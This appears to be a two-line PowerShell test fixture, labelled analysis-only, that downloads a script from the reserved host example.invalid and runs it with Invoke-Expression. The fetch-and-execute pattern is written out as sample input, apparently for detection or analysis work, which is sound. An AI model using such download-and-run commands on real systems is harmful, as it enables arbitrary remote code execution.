# Analysis-only fixture. example.invalid is reserved and intentionally unreachable.
Invoke-WebRequest https://example.invalid/a.ps1 -OutFile a.ps1
Invoke-Expression (Get-Content a.ps1 -Raw)
